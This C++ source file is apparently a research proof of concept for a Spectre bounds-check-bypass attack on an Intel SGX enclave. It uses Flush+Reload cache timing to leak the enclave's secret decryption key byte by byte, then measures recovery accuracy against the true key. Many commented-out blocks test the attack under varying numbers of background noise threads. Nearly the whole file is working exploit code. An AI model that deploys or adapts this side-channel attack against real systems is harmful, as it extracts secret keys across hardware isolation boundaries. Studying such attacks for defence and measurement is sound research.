/*
 * Copyright 2018 Imperial College London
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at   
 * 
 *      http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "pthread.h"
#include <errno.h>
#include <signal.h>
#include <sched.h>

#pragma comment (lib, "pthreadVC2.lib")

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <iostream>
#include <chrono>
#include <thread>
#include <atomic>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include "enclave_u.h"
#include "enclave_init.h"
#include "utils.hpp"

#include <random>
#include <cstdint>


struct pp_arg_struct {
	int junk;
	int tries;
	int *results;
};

struct pt_arg_struct {
	size_t malicious_x; 
	int tries;
};

#define FIX_CPU_CORE 1
#define DEBUG 1
#define MESURE_EACH 0
#define ACCESS_FREQ 6
#define EXEC_NUM 1
#define CACHE_MISS_THRESHOLD (60) /* assume cache miss if time >= threshold */
#define CACHE_HIT_THRESHOLD (100) /* assume cache hit if time <= threshold */

using namespace std;

extern sgx_enclave_id_t global_eid;

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1dupe[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];
uint64_t secretKey[N];
uint64_t ciphertext[2][N];
uint64_t plaintext[N];

uint8_t result[LEN+1];
double exec_times[3][LEN];
double read_byte[2];
int finished_byte = 0;
int ret = 0;
int ten_s_cnt = 1;

int learn_loop = 20;
int global_tries = 100;
std::atomic<bool> stopFlag(false);

void set_thread_affinity(std::thread& thread, int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);

    int ret = pthread_setaffinity_np(thread.native_handle(), sizeof(cpu_set_t), &cpuset);
    if (ret != 0) {
        std::cerr << "Error setting thread affinity: " << strerror(ret) << std::endl;
    }
}

/********************************************************************
 Analysis code
********************************************************************/
////////////////////////////////////////////////////////////////////
//		Flush+Reload
////////////////////////////////////////////////////////////////////

 /* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int len) {
	static int results[256];
	int tries, i, j, k, mix_i; 
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	struct timespec start_time, end_time;
	double execution_time = 0;

	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (tries = global_tries; tries > 0; tries--) {
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
		_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

#if MESURE_EACH
		clock_gettime(CLOCK_MONOTONIC, &start_time);
#endif
		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = learn_loop; j >= 0; j--) {
			_mm_clflush(&array1_size);
			volatile int z;
			//for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
			
			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % ACCESS_FREQ) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));
			
			/* Call the victim! */ 
			// SGX_ASSERT(ecall_victim_function(global_eid, x, array2, &array1_size));
			SGX_ASSERT(ecall_decrypt(global_eid, x, ciphertext[0], ciphertext[1], plaintext, array2, &array1_size));
		}
#if MESURE_EACH
		clock_gettime(CLOCK_MONOTONIC, &end_time);
		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
		exec_times[0][LEN-len-1] = execution_time;
#endif
		
		//clock_gettime(CLOCK_MONOTONIC, &start_time);
		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++) {
mix_i = ((i * 167) + 13) & 255;
			//asm volatile("lfence" ::: "memory");
			//asm volatile("mfence" ::: "memory");
			addr = &array2[mix_i * 512];
			//asm volatile("lfence" ::: "memory");
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			//volatile int dummy = 0;
			//for(int d = 0; d < 100000; d++)dummy += d;
			//asm volatile("lfence" ::: "memory");
			//asm volatile("mfence" ::: "memory");
			//std::this_thread::sleep_for(std::chrono::nanoseconds(1)); //成功
			//printf("B\n");
			//fprintf(stderr, "%ld\n",time2);//追加 成功
			// fprintf(stderr, "A\n");
			//if (time2 <= CACHE_HIT_THRESHOLD)
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
			{
				results[mix_i]++; /* cache hit - add +1 to score for this value */
			}
			//asm volatile("lfence" ::: "memory");
			//asm volatile("mfence" ::: "memory");
		}
#if MESURE_EACH
		clock_gettime(CLOCK_MONOTONIC, &end_time);
		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
		exec_times[1][LEN-len-1] = execution_time;
#endif
		

#if MESURE_EACH
		clock_gettime(CLOCK_MONOTONIC, &start_time);
#endif
		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
#if MESURE_EACH
		clock_gettime(CLOCK_MONOTONIC, &end_time);
		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
		exec_times[2][LEN-len-1] = execution_time;
#endif

		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}

	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}



/////////////////////////////////////////////////////////////////////////
// Spectre Main
//////////////////////////////////////////////////////////////////////////

int spectre_main(int argc, char **argv) {

#if FIX_CPU_CORE	
	//fix cpu core******************************************************
    cpu_set_t cur_mask, new_mask;
    size_t length = sizeof(cur_mask);
    pid_t pid = getpid();
 
    // 現在の設定値を取得・表示 
    if (sched_getaffinity(0, length, &cur_mask)) {
        perror("sched_getaffinity");
        return -1;
    }
    printf("pid %d's old affinity: %08lx\n", pid, *(unsigned long*)cur_mask.__bits);
 
    // mask を CPU1 のみに設定 
    CPU_ZERO(&new_mask);
    CPU_SET(1, &new_mask);
 
    // mask 値を反映 
    if (sched_setaffinity(0, length, &new_mask)) {
        perror("sched_setaffinity");
        return -1;
    }
	printf("pid %d's new affinity: %08lx\n", pid, *(unsigned long*)new_mask.__bits);
	//*******************************************************************
#endif

	size_t malicious_x; 
	SGX_ASSERT(ecall_get_offset(global_eid, &malicious_x)); /* default for malicious_x */
	//malicious_x += N*8-1;

	int i, score[2];
	int len = LEN;
	uint8_t value[2];
	struct timespec start_time, end_time;
	chrono::system_clock::time_point  start, end;
	double execution_time = 0;
	double total_execution_time = 0;
	
	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	printf("Reading %d bytes:\n", len);
	while (--len >= 0) {
		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
		start = chrono::system_clock::now();
		readMemoryByte(malicious_x++, value, score, len);	//++ OR --
		end = chrono::system_clock::now();
		result[LEN-len-1] = value[0];

		execution_time = chrono::duration_cast<std::chrono::nanoseconds>(end-start).count() / 1000000000.00; //[s]
		total_execution_time += execution_time;
		exec_times[0][LEN-len-1] = execution_time;

		if(len <= 0) {
			printf("finished\n");
			read_byte[0] = LEN-len;
			read_byte[1] = total_execution_time;
			finished_byte = LEN-len;
		}

#if DEBUG
		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
#endif
	}
	return (0);
}

void printByteArray(const unsigned char *array, size_t size) {
    for (size_t i = 0; i < size; i++) {
        printf("%02X ", array[i]);
    }
    printf("\n");
}

void checkResult(int cnt, int runcnt) {

	int count = 0;
	const uint8_t *sk = (const uint8_t *)secretKey;
	//printf("AAA\n");
	for(int i = 0; i < finished_byte; i++) {
		//if(result[i] == sk[8*N-i-1]) count++;
		if(result[i] == sk[i]) count++;
		printf("i = %d: sk = %02X, result = %02X\n", i, sk[i], result[i]);
	}
	//printf("BBB\n");

	double accr = 100.000 * (double)count/finished_byte;
	printf("Accuracy = %.3f %% (%d/%d)[bytes]\n", accr, count, finished_byte);
	printf("Total time = %.3f [s]\n", read_byte[1]);

	printf("%.4f \n", accr);
	printf("%.4f \n", read_byte[1]);

	string fname_state = "l"+to_string(learn_loop);
	fname_state += "t";
	fname_state += to_string(global_tries);

	outputResult(read_byte, cnt, runcnt ,accr, "read_byte"+fname_state, 2, 2);
	outputResult(exec_times[0], 0, runcnt ,0, string("exec_times")+fname_state, finished_byte-1, 2);
#if MESURE_EACH
	outputResult(exec_times[1], 1, runcnt ,0, "exec_times", finished_byte, 2);
	outputResult(exec_times[2], 2, runcnt ,0, "exec_times", finished_byte, 2);
#endif
}

void spectre_thread(int argc, char **argv, int i){

	spectre_main(argc, argv);
	stopFlag.store(true);
}

#define ARRAY_SIZE (24 * 1024 * 1024 / sizeof(double))  // 12MB分の配列 (CPUのL3キャッシュサイズに合わせて変更)
// 配列全体を何度もアクセスする関数
void access_array(double *rand_array) {
    for (size_t i = 0; i < ARRAY_SIZE; i++) {
        double index = rand();
        rand_array[i*8%ARRAY_SIZE] += index;  // データにアクセスして変更
        // printf("%f\n", rand_array[i*8%ARRAY_SIZE]);
    }
}

void rand_func() {
	int lim = 1000000000;
	// ファイルを開く
    FILE *output_file = fopen("output.txt", "w");
    if (output_file == NULL) {
        fprintf(stderr, "ファイルのオープンに失敗しました\n");
        return;
    }

    double *rand_array = (double*)malloc(ARRAY_SIZE * sizeof(double));  // メモリに配列を確保
    if (rand_array == NULL) {
        fprintf(stderr, "メモリの確保に失敗しました\n");
    }

    // 配列を初期化
    for (size_t i = 0; i < ARRAY_SIZE; i++) {
        rand_array[i] = (double)rand() / RAND_MAX;
    }

    // 無限に配列をアクセスし続ける
    // while (!stopFlag.load() && lim) {
    //     access_array(rand_array);
	// 	lim--;
    // }

	// 無限に配列をアクセスし続ける
    while (lim) {
        access_array(rand_array);
		if(stopFlag){
			break;
		}
		lim--;
    }

    // 配列の内容をファイルに書き込む
    for (size_t i = 0; i < ARRAY_SIZE; i++) {
        fprintf(output_file, "%f\n", rand_array[i]);
    }

    free(rand_array);
	fclose(output_file);
}

void decrypt_thread(int argc, char **argv, int t){
	int lim = 1000000000;
	while (!stopFlag.load() && lim) {
		// for(int i = 0; i < N; i++) {
		// 	SGX_ASSERT(ecall_decrypt_only(global_eid, i, ciphertext[0], ciphertext[1], plaintext, &array1_size));
		// }

	// // 	// for(int i = 0; i < N; i++) {
	// // 	// 	plaintext[i] = ciphertext[0][i] + ciphertext[1][i]*secretKey[i];
	// // 	// }
	// // 	//  for (int i = 0; i < 256; i++)
	// // 	//  _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
	// // 	// // printf("%d : debug\n", std::this_thread::get_id());
	// // 	// SGX_ASSERT(ecall_access_sk(global_eid));
	// // 	// SGX_ASSERT(ecall_pollute_cache(global_eid));
	
	
		rand_func();

		lim--;
	}

	// while(lim){
	// 	rand_func();
	// 	if(stopFlag){
	// 		break;
	// 	}
	// 	lim--;
	// }
}

/* Application entry */
int main(int argc, char *argv[])
{
	//freopen("/dev/null", "w", stderr);

    /* Initialize the enclave */
    initialize_enclave();

	readSecretKey((std::to_string(N) + "/secret_key").c_str(), secretKey);
	readCiphertext((std::to_string(N) + "/ciphertext").c_str(), ciphertext);
	// saveSecretKeyToTxt("secret_key_value.txt", secretKey);
	
	// std::random_device rd;
	// std::mt19937_64 gen(rd());
	// std::uniform_int_distribution<uint64_t> dist(0, UINT64_MAX);
	// for (size_t i = 0; i < N; ++i) secretKey[i] = dist(gen);

	
	SGX_ASSERT(ecall_load_key(global_eid, secretKey));

	learn_loop = std::atoi(argv[1]); global_tries = std::atoi(argv[2]);
	printf("lean_loop = %d, global_tries = %d\n", learn_loop, global_tries);

	// /* Call the main attack function (シングルスレッドの場合)*/
	for(int i = 0; i < EXEC_NUM; i++) {
		stopFlag.store(false);
		std::thread th_0(spectre_thread, argc, argv, i);
		set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
		th_0.join();
		checkResult(i, std::atoi(argv[3]));
		dump_result_csv_timestamp(result, secretKey, finished_byte);
	}

	//for(int i = 0; i < N; i++)cout << secretKey[i] << std::endl;

    /* Call the main attack function （マルチスレッドの場合）*/
	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	checkResult(i, 0);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	checkResult(i, 1);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	checkResult(i, 2);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	checkResult(i, 3);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	th_4.join();
	// 	checkResult(i, 4);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	th_4.join();
	// 	th_5.join();
	// 	checkResult(i, 5);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	th_4.join();
	// 	th_5.join();
	// 	th_6.join();
	// 	checkResult(i, 6);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	th_4.join();
	// 	th_5.join();
	// 	th_6.join();
	// 	th_7.join();
	// 	checkResult(i, 7);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	th_4.join();
	// 	th_5.join();
	// 	th_6.join();
	// 	th_7.join();
	// 	th_8.join();
	// 	checkResult(i, 8);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_9(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_9, 9);  // Thread 9 -> Core 9
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	th_4.join();
	// 	th_5.join();
	// 	th_6.join();
	// 	th_7.join();
	// 	th_8.join();
	// 	th_9.join();
	// 	checkResult(i, 9);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_9(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_9, 9);  // Thread 9 -> Core 9
	// 	std::thread th_10(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_10, 10);  // Thread 10 -> Core 10
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	th_4.join();
	// 	th_5.join();
	// 	th_6.join();
	// 	th_7.join();
	// 	th_8.join();
	// 	th_9.join();
	// 	th_10.join();
	// 	checkResult(i, 10);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_3(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_3, 3);  // Thread 3 -> Core 3
	// 	std::thread th_4(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_4, 4);  // Thread 4 -> Core 4
	// 	std::thread th_5(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_5, 5);  // Thread 5 -> Core 5
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_8(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_8, 8);  // Thread 8 -> Core 8
	// 	std::thread th_9(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_9, 9);  // Thread 9 -> Core 9
	// 	std::thread th_10(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_10, 10);  // Thread 10 -> Core 10
	// 	std::thread th_11(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_11, 11);  // Thread 11 -> Core 11
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_1.join();
	// 	th_2.join();
	// 	th_3.join();
	// 	th_4.join();
	// 	th_5.join();
	// 	th_6.join();
	// 	th_7.join();
	// 	th_8.join();
	// 	th_9.join();
	// 	th_10.join();
	// 	th_11.join();
	// 	checkResult(i, 11);
	// }

	//マルチスレッド（実行順0-6-1-7~）
	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	checkResult(i, 0);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	checkResult(i, 1);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	checkResult(i, 2);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	checkResult(i, 3);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
	// 	std::thread th_7(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_7, 7);  // Thread 7 -> Core 7
	// 	std::thread th_2(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_2, 2);  // Thread 2 -> Core 2
	// 	std::thread th_0(spectre_thread, argc, argv, i);
	// 	set_thread_affinity(th_0, 0);  // Thread 0 -> Core 0
	// 	th_0.join();
	// 	th_6.join();
	// 	th_1.join();
	// 	th_7.join();
	// 	th_2.join();
	// 	checkResult(i, 4);
	// }

	// for(int i = 0; i < EXEC_NUM; i++) {
	// 	stopFlag.store(false);
	// 	std::thread th_6(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_6, 6);  // Thread 6 -> Core 6
	// 	std::thread th_1(decrypt_thread, argc, argv, i);
	// 	set_thread_affinity(th_1, 1);  // Thread 1 -> Core 1
